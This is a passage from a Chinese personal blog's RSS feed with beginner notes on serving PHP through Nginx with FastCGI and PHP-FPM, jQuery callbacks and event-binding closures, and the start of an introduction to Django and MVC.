的</p></blockquote><p>毕竟不了解，一直很纳闷。php在在nginx 的主机上跑的好好的怎么就不支持了呢。</p><p>实际上 Nginx 上的PHP，严格意义上讲是通过第三方的支持，而本身是不能直接解释 PHP 脚本的。</p><hr><p>LAMP 的经典架构下面，需要这几个东西：</p><ul><li>Linux<br>   安装 Apache    </li><li>安装 php</li><li>安装 mysql</li></ul><p>简简单单的几个 apt-get 发现使用 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>页面就已经得到了解析了。因为，当我们对目标php进行访问之后，apache 自动的开始 解释脚本，和渲染内容了，所以apache 是支持php 的。</p><hr><p>然而，如果我们把 <strong>index.php</strong>  放在Nginx 的根目录下，打开是怎样的？ </p><p>结果是完完全全的纯文本的形式打开了来。可见Nginx 并未对PHP脚本进行解析。所以说 <strong>Nginx 是不支持 php</strong>  是正确的。</p><p>那么一个 PHP 的页面要怎么跑上去呢？</p><p>在这里， Nginx 把他转换成了一个 <strong>CGI 问题</strong> ： <strong>FastCGI！</strong></p><blockquote><p>与为每个请求创建一个新的进程不同，FastCGI使用持续的进程来处理一连串的请求。这些进程由FastCGI服务器管理，而不是web服务器。 当进来一个请求时，web服务器把<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JThFJUFGJUU1JUEyJTgzJUU1JThGJTk4JUU5JTg3JThG" title="https://zh.wikipedia.org/wiki/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量<i class="fa fa-external-link"></i></span>和这个页面请求通过一个<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvU29ja2V0" title="https://zh.wikipedia.org/wiki/Socket">socket<i class="fa fa-external-link"></i></span>比如FastCGI进程与web服务器（都位于本地）或者一个<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJUEwJUU4JUJFJTkzJUU2JThFJUE3JUU1JTg4JUI2JUU1JThEJThGJUU4JUFFJUFF" title="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP<i class="fa fa-external-link"></i></span> connection（FastCGI进程在远端的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPVNlcnZlcl9mYXJtJmFtcDthY3Rpb249ZWRpdCZhbXA7cmVkbGluaz0x" title="https://zh.wikipedia.org/w/index.php?title=Server_farm&amp;action=edit&amp;redlink=1">server farm<i class="fa fa-external-link"></i></span>）传递给FastCGI进程。</p></blockquote><p>Http服务其的作用是任务下发的</p><p> FastCGI 是 Nginx 下的一个模块 ngx_http_fastcgi_module 。通过这个模块，我们可以把对应路径的HTTP 请求，可以下发到 fastcgi 这个模块，这个模块会使用 语言对应的解释器，进行执行，并返回结果!,</p><p><strong>这事就这样成了</strong></p><hr><blockquote><p>php本身只是一种脚本语言，其良好的特性使其可以服务 web</p></blockquote><p>在PHP 里面我们很容易的可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样来个教科书式的 hello 。这里使用 php 这个 解释器对这个脚本进行了解释，输出了这样的结果。</p><p>这里就出现了 PHP-FPM (FastCGI Process Manager)。</p><p>这个就是 Nginx 使用FastCGI 最终所使用的东西。它负责创建管理 解释PHP 的进程。这个过程也越来越明了了</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL3EvMTAxMDAwMDAwMDI1NjUxNg==" title="https://segmentfault.com/q/1010000000256516">搞不清FastCgi与PHP-fpm之间是个什么样的关系<i class="fa fa-external-link"></i></span></li></ul></blockquote><hr><p>这里，便贴出来核心配置， 这样一看便懂了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">    listen       8011;  </span><br><span class="line">    server_name  test.cn;  </span><br><span class="line">    location ~ \.php?.*$ &#123;  </span><br><span class="line">        root           /share/test;  </span><br><span class="line">        fastcgi_pass   127.0.0.1:9000;  </span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;  </span><br><span class="line">        include        fastcgi_params;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>root 代表以此为根</li><li>fastcgi_pass 指定了fmp 的监听端口 （注意 FPM 是一个已经启动的服务）</li><li>fastcgi_param 这个就是重要的参数了，这里传递给了fastcgi  一个SCRIPT_FILENAME的参数，其参数值 将要被执行的脚本的文件名 ，文件路径，</li></ul><p>这样一个流程下来， PHP 就可以被执行了</p><h3 id="一些值得注意的地方"><a href="#一些值得注意的地方" class="headerlink" title="一些值得注意的地方"></a>一些值得注意的地方</h3><h4 id="master-process-这个配置项"><a href="#master-process-这个配置项" class="headerlink" title="master_process 这个配置项"></a>master_process 这个配置项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master_process on | off</span><br></pre></td></tr></table></figure><p>测过配置项如果  使用 off ，nginx 就会使用单进程模式运行，<strong>方便调试</strong></p><h4 id="PID-文件的作用"><a href="#PID-文件的作用" class="headerlink" title="PID 文件的作用"></a>PID 文件的作用</h4><p>在配置里面会有这样一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid /var/log/xxx.pid</span><br></pre></td></tr></table></figure><p>PID 从字面上理解这里是processID，这个文件也的确是保存的当前运行的PID 。这样我们如果运行了多个 Nginx 的进程， 我们想kill 掉其中的的一个，就可以很方便的使用这个 PID 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -HUP `cat /var/log/xxx.pid`</span><br></pre></td></tr></table></figure><h4 id="root-和-alias"><a href="#root-和-alias" class="headerlink" title="root 和 alias"></a>root 和 alias</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /admin &#123;</span><br><span class="line">    root /vagrant/pro/static;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ^~ /admin2 &#123;</span><br><span class="line">    alias /vagrant/pro/static;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在对 一个虚拟服务器 的location 配置的时候，这里就需要涉及到其路由相关的配置。里面就有了 alias 和root 这两种指定路径的方式。</p><p>简单的讲， </p><ul><li><p>alias     直接把我们请求的路径 <strong>直接替换为下面的绝对地址</strong> 正如其译意 <strong>别名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.com/admin --&gt; /vagrant/pro/static</span><br></pre></td></tr></table></figure><p>   root    的意思是根， 这里意味着把下面指定的绝对路径作为访问的根目录，之后再在后面添加上我们请求的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.com/admin --&gt; /vagrant/pro/static/admin</span><br></pre></td></tr></table></figure></li></ul><hr><p>在一般使用的时候使用alias ，同时可以使用正则，和参数。</p><p>这里配置一个下载的话使用如下配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/download/(.*)$ &#123;</span><br><span class="line">    alias /data/files/$1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样可以实现一个匹配下载的功能，可以使用 <code>get /download/xxx.exe</code>的方式即可返回 xxx.exe</p><h4 id="IPv4-到-IPv6"><a href="#IPv4-到-IPv6" class="headerlink" title="IPv4 到 IPv6"></a>IPv4 到 IPv6</h4><p>这里虽然不是很常用，现在国内的IPV6 还杳无音讯。不过这里记录一下。</p><p>在Listen 进行虚拟服务器的 端口绑定的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen *：80; # 意味着所有本机地址的监听</span><br><span class="line">listen loaclhost:8000;</span><br></pre></td></tr></table></figure><p>IPv4 到 IPv6 的映射：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::ffff:127.0.0.1</span><br></pre></td></tr></table></figure><p>使用这样的方法，可以实现把一个 v4 的流量转发到一个 v6 的监听端口上</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这里是自己的一些问题，和理解。是自问自答，和网上的问题的收集。</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyMjEyOTk2" title="https://www.zhihu.com/question/32212996">tomcat 与 nginx，apache的区别是什么？<i class="fa fa-external-link"></i></span></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy52b2lkY24uY29tL2FydGljbGUvcC1vZHNzemZvcS1laC5odG1s" title="http://www.voidcn.com/article/p-odsszfoq-eh.html">web服务，服务器，容器，中间件<i class="fa fa-external-link"></i></span></li></ul>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/09/06/OP_Nginx%20%E7%9A%84%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Web 杂记</title>
      <link>https://www.diglp.xyz/2018/08/20/web_2/</link>
      <guid>https://www.diglp.xyz/2018/08/20/web_2/</guid>
      <pubDate>Sun, 19 Aug 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;Foreword&quot;&gt;&lt;a href=&quot;#Foreword&quot; class=&quot;headerlink&quot; title=&quot;Foreword&quot;&gt;&lt;/a&gt;Foreword&lt;/h2&gt;&lt;p&gt;这个计划叫做 TC 计划， 没错，叫做 Tab
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>这个计划叫做 TC 计划， 没错，叫做 Tab Closing。</p><p>每周的的现象是什么？ 浏览器的标签爆炸。</p><p>总是有些好的内容，舍不得关闭。可是有没有再去看，所以，借机整理一下了~</p><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><h3 id="关于-BootStrap"><a href="#关于-BootStrap" class="headerlink" title="关于 BootStrap"></a>关于 BootStrap</h3><p>这个东西算是贯串了整个的开发周期的东西。什么是 BootStrap ？简单来讲就是一个前端的 UI 框架。</p><blockquote><p>Bootstrap是一组用于网站和网络应用程序开发的开源前端框架，包括HTML、CSS及JavaScript的框架，提供字体排印、窗体、按钮、导航及其他各种组件及Javascript扩展，旨在使动态网页和Web应用的开发更加容易。 </p></blockquote><p>简单来讲，其实就是可以很容易的是的我们的页面变得更加 的好看。我们的 html 的基本组件，显得十分单一啦。通过bootstrap的框架，使得我们可以使用其中预设的一些组件和样式，这样使得我们的ui的设计显得更加的容易和美观。使用期预设的组件，显得都是那么美观了。</p><hr><p>这里 对资料进行一些整理。</p><ul><li><p><span class="exturl" data-url="aHR0cDovL3d3dy5ydW5vb2IuY29tL2Jvb3RzdHJhcC9ib290c3RyYXAtdHV0b3JpYWwuaHRtbA==" title="http://www.runoob.com/bootstrap/bootstrap-tutorial.html">bootstrap - runboo<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubnBtanMuY29tL3BhY2thZ2UvYm9vdHN0cmFwLXNsaWRlcg==" title="https://www.npmjs.com/package/bootstrap-slider">bootstrap-slider<i class="fa fa-external-link"></i></span></p></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubnBtanMuY29tL3BhY2thZ2UvYm9vdHN0cmFwLXRhYmxl" title="https://www.npmjs.com/package/bootstrap-table">bootstrap-table<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubnBtanMuY29tL3BhY2thZ2UvYm9vdHN0cmFwLXN3aXRjaA==" title="https://www.npmjs.com/package/bootstrap-switch">bootstrap-switch<i class="fa fa-external-link"></i></span></li></ul><h3 id="关于-JQuery"><a href="#关于-JQuery" class="headerlink" title="关于 JQuery"></a>关于 JQuery</h3><p>很久之前， 有在图书馆 见到一本书 《锋利的jquery》，当时因为不清楚，也没有被 好奇心驱使 。所以，最近在知道这个 是什么东西。(笑， 看到 query 之前一直以为和数据库有关系) </p><p>这里搬出 百科内容。</p><blockquote><p>jQuery是一套跨浏览器的JavaScript库，简化HTML与JavaScript之间的操作。 </p></blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24vanMvaW5kZXguYXNw" title="http://www.w3school.com.cn/js/index.asp">JavaScript - W3School<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24vanF1ZXJ5L2luZGV4LmFzcA==" title="http://www.w3school.com.cn/jquery/index.asp">Jquery - W3School<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24vYWpheC9pbmRleC5hc3A=" title="http://www.w3school.com.cn/ajax/index.asp">AJAX - W3School<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2xzLmNvbS8=" title="https://www.w3schools.com/">世界上最大的WEB开发者网站 - W3schools<i class="fa fa-external-link"></i></span></li></ul><h3 id="Js-里的-异步-回调"><a href="#Js-里的-异步-回调" class="headerlink" title="Js 里的 (异步)回调"></a>Js 里的 (异步)回调</h3><p>感觉 js 这种函数式 编程的精妙的结构，在下面的简简单单的三行代码，就体现出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#profileTab"</span>).append(<span class="function"><span class="keyword">function</span> (<span class="params">index, html</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $(<span class="string">'#tab_profile'</span>).html().replaceAll(<span class="string">'tmpvar'</span>, id);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><p>JS 里面实现一个回调的结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">arg1, arg2, callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = arg1 + arg2;</span><br><span class="line">    callback(num);　　<span class="comment">//传递结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">20</span>, <span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">"Callback called! Num: "</span> + num); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>之前，对这些东西，并不是十分理解，深圳觉得这样的结构是不是有些多余。这样的东西，完全可以使用一个顺序的正常的结构实现啊</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">arg1, arg2, callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = arg1 + arg2;</span><br><span class="line">    print(num);　　<span class="comment">//传递结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以实现上面的功能了，而且简单很多，然而实际上，并不是这样的了。</p><p>回想起来，如果在之前的应用程序开发的过程中。如果把一个冗长的过程放在主线程里，会怎样？</p><p>比如在主线程里面进行网络请求，常常这个过程，会有一段响应时间，这样就直接导致了我们的主线程的阻塞。所以，Android 的 sdk 里面，已经禁止了在主线程里面进行网络请求。否则直接导致了 app 的卡顿了。所以这时候，要是传统的应用，理应会打开了一个 线程，来进行网络操作。</p><p>不过这个问题，在JS 里面有了另外一种的优雅的解决方案，就是这里括号里面的字，异步。在我们使用了回调结构之后。会发现，add 函数并不会阻塞原运行的过程。而是继续的向下运行。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbW9sdGJveS9hcmNoaXZlLzIwMTMvMDQvMjQvMzA0MDIxMy5odG1s" title="https://www.cnblogs.com/moltboy/archive/2013/04/24/3040213.html">彻底理解javascript的回调函数<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="JS-的事件绑定"><a href="#JS-的事件绑定" class="headerlink" title="JS 的事件绑定"></a>JS 的事件绑定</h3><p>关于 JS 里面的页面事件 绑定，用其来，的确是很直观</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"p"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="keyword">this</span>).hide();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样的很简单的语句，就是实现了在文中的所有的 <code>&lt;p&gt;</code> 元素绑定了点击事件。</p><p>可心中有了个疑问，这个事件是怎么进行绑定的呢？直到遇到了这样的问题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tab_trOnclick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> trs=$(<span class="string">"#block_set_table tbody tr"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;trs.length;i++)&#123;</span><br><span class="line">        $(trs[i]).on(<span class="string">"dblclick"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的代码，之前的我是这样理解的：</p><p>首先这段代码<strong>得到运行</strong>，得到每一行的标签<code>&lt;tr&gt;</code> ， 之后对每个元素的对于的 点击事件函数进行初始化。然后，对每一行的点击，之后控制台里会打印出对应的行的行号。第一行<strong>里面的 i 是 1</strong>，那么点击第一行就输出 1。以此类推。</p><p>不过事实上运行的 结果是：点击每一行都只是输出一个相同的数字。而且其数字等于 tr 的个数，也就是我们的行数。</p><p>why? 这里就出现问题了。前面的内容讲到：回调？异步？所以事实上的过程就清楚了。是这样的：</p><p>for 循环执行了 $(x).on() ,  这个函数是个回调函数。事实上是一个有实践进行触发的函数。当没有时间的时候，这个回调，不会继续的执行下去。然而在主线程里面，这个 for 还在不断的给其他的 tr 来绑定事件。这个 <strong>i</strong> 的值还在不断<strong>加1</strong>  直到所有绑定全部完成。 (注意！这里的回单函数没有返回，所以这里的函数的作用域中的变量值一样的没有被释放)。 当我们进行点击的时候，<strong>那时的 i 就是 tr 的个数</strong> 没错了。</p><p>所以，这种情况下，需要在回调中获得原元素中的 id 信息，从而得到序号。最终得到的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tab_trOnclick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> trs=$(<span class="string">"#block_set_table tbody tr"</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;trs.length;i++)&#123;</span><br><span class="line">          $(trs[i]).on(<span class="string">"dblclick"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="keyword">var</span> tr=$(<span class="keyword">this</span>);</span><br><span class="line">              <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^[0-9]*$"</span>);</span><br><span class="line">              rowNum = (tr.context.id).match(<span class="string">"[0-9]*$"</span>)[<span class="number">0</span>]</span><br><span class="line">              <span class="built_in">console</span>.log(rowNum)</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="元素复用列表追加"><a href="#元素复用列表追加" class="headerlink" title="元素复用列表追加"></a>元素复用列表追加</h3><p>有个需要用到多次的元素， 如果直接使用 html</p><p>进行硬编码，得到 n*xx 的代码体验的确是不怎么优雅。 这里使用 JS 对空标签进行 append ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;test&quot;&gt; &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"> for(var i=1;i&lt;trs.length;i++)&#123;</span><br><span class="line"> $(&apos;#test&apos;).append(&apos;&lt;h4&gt;hello&lt;/h4&gt;&apos;);</span><br><span class="line"> &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><ul><li><p>动态添加元素的事件绑定</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEyNzcxMjMvYXJ0aWNsZS9kZXRhaWxzLzUzMzMwODg3" title="https://blog.csdn.net/u011277123/article/details/53330887">jquery动态添加元素无法触发绑定事件的解决方案<i class="fa fa-external-link"></i></span></p></blockquote></li><li><p>元素重复初始化</p></li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>慢慢的对 web 开发的整体结构有了了解，现在有了基础，就要开始高速适用了。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/08/20/web_2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Django WEB 开发入门</title>
      <link>https://www.diglp.xyz/2018/08/10/web_1/</link>
      <guid>https://www.diglp.xyz/2018/08/10/web_1/</guid>
      <pubDate>Thu, 09 Aug 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;Foreword&quot;&gt;&lt;a href=&quot;#Foreword&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>古语有言：勤能补拙。这个也算是自己的一周的总结吧。把一周的学到的，和自己的一些感悟做个记录吧。</p><p>虽然，是很基础的东西，不过一切都是从基础开始的对吧？</p><p>sigh…</p><h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h3><h4 id="Django-是什么？"><a href="#Django-是什么？" class="headerlink" title="Django 是什么？"></a>Django 是什么？</h4><blockquote><p>Python下有许多款不同的 Web 框架。Django是重量级选手中最有代表性的一位。 </p></blockquote><p>Django 是 python 的一个 web的框架。在框架中整合了，web 服务中的所涉及的功能。</p><ul><li>提供web服务</li><li>后台数据获取</li><li>请求响应</li></ul><p>前端什么的真的是不怎么懂，自然会有些，很傻的问题。不过实际上也是困扰了自己很久的问题：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMuY3Nkbi5uZXQvdG9waWNzLzM5MDI2ODY0MQ==" title="https://bbs.csdn.net/topics/390268641">大（中）型网站的后端会用到C/C++吗<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMuY3Nkbi5uZXQvdG9waWNzLzM5MDI2ODY0MQ==" title="https://bbs.csdn.net/topics/390268641">Web 开发中，Python 和 PHP 哪个有优势？<i class="fa fa-external-link"></i></span></p></blockquote><hr><ul><li><p>PHP 本身是一种编程语言，是和 python 一个层级，.py 需要 python runtime 。.php 需要 php 的runtime。两个东西都可以很简单的使用 <code>python x.py</code> 和 <code>php x.php</code>  的运行起来</p></li><li><p>当 python 使用 flask/Django 开始web 开发的时候了。和 PHP 的web框架(ThinkPHP) 作用在一个层级了。<strong>不准确的讲</strong>每次访问，都会启动一个进程，对这个脚本内的内容进行运行， 这里的运行是在服务器端的。对我的的请求进行解析，比如url 的路由路径， 请求方式等进行响应。</p></li><li><p>这时候仍然是在服务器端， 进行数据库的增删查改。 把操作(得到的数据，传递到前端（这里是前后端的数据交互方式，后面写）) <code>index.php?category=x</code></p></li><li><p>前端进行数据获取，由 js 脚本，实现静态html 的显示刷新</p></li></ul><h4 id="WEB-请求的流程"><a href="#WEB-请求的流程" class="headerlink" title="WEB 请求的流程"></a>WEB 请求的流程</h4><p>PHP开发Web应用时所以的请求需要指向具体的入口文件。WebServer是一个内容分发者，他接受用户的请求后，如果是请求的是css、js等静态文件，WebServer会找到这个文件，然后发送给浏览器；如果请求的是/index.php，根据配置文件，WebServer知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器。   </p><blockquote><p>内容引用自 <span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwODgzODgwNA==" title="https://segmentfault.com/a/1190000008838804">SF - WEB请求的流程<i class="fa fa-external-link"></i></span></p></blockquote><p>当然，这里是的标题是 PHP 的web 请求流程，其实感觉删掉前面的几个字，也是差不多的。</p><p>这里 ，开始列举名词 。 nginx，Apache， php， python ，django ， thinkphp。清楚了不少吧。</p><p>慢慢的对这个过程还是有点清楚的了，有个东西 叫做 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JTgwJTlBJUU3JTk0JUE4JUU3JUJEJTkxJUU1JTg1JUIzJUU2JThFJUE1JUU1JThGJUEz" title="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3"><strong>CGI</strong> 通用网关接口<i class="fa fa-external-link"></i></span></p><h4 id="MVC-是什么？"><a href="#MVC-是什么？" class="headerlink" title="MVC 是什么？"></a>MVC 是什么？</h4><p>到底什么才是标准的 MVC 这个问题，到现在作者也没有一个<strong>确切的</strong>答案；不过多个框架以及书籍对 MVC 的理解有一点是完全相同的，也就是它们都将整个应用分成 Model、View 和 Controller 三个部分，而这些组成部分其实也有着几乎相同的职责。</p><ul><li>视图：管理作为位图展示到屏幕上的图形和文字输出；</li><li>控制器：翻译用户的输入并依照用户的输入操作模型和视图；</li><li>模型：管理应用的行为和数据，响应数据请求（经常来自视图）和更新状态的指令（经常来自控制器）；</li></ul><blockquote><p>上述内容出自 <span class="exturl" data-url="aHR0cDovL3d3dy5kZ3AudG9yb250by5lZHUvfmR3aWdkb3IvdGVhY2hpbmcvY3NjMjUyNC8yMDEyX0YvcGFwZXJzL212Yy5wZGY=" title="http://www.dgp.toronto.edu/~dwigdor/teaching/csc2524/2012_F/papers/mvc.pdf">Applications Programming in Smalltalk-80: How to use Model-View-Controller (MVC)<i class="fa fa-external-link"></i></span> 一文。 </p></blockquote><hr><p>Django的MTV模式本质上和MVC是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django的MTV分别是值：</p><ul><li><p>M 代表模型（Model）：负责业务对象和数据库的关系映射(ORM)。 # 这里是和数据库交互的地方</p></li><li><p>T 代表模板 (Template)：负责如何把页面展示给用户(html)。# 这个就是我们的 html 页面</p></li><li><p>V 代表视图（View）：负责业务逻辑，并在适当时候调用Model和Template # 实现 前端请求响应的地方</p></li></ul><p>（上面👆，的内容在 工程文件加里，都明确的使用各个文件分开了）</p><p>除了以上三层之外，还需要一个URL分发器，它的作用是将一个个URL的页面请求分发给不同的View处理，View再调用相应的Model和Template </p><p>[<img src="http://assets.tianmaying.com/md-image/f94775f85c94e999bc685f0b11d3c461" alt="img"> </p><blockquote><p>以上引用自 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdIZW5nODE2L2FydGljbGUvZGV0YWlscy81MjIxMzk4Mw==" title="https://blog.csdn.net/YangHeng816/article/details/52213983">csdn - YangHeng816<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这里描述的，是 Django 这个web 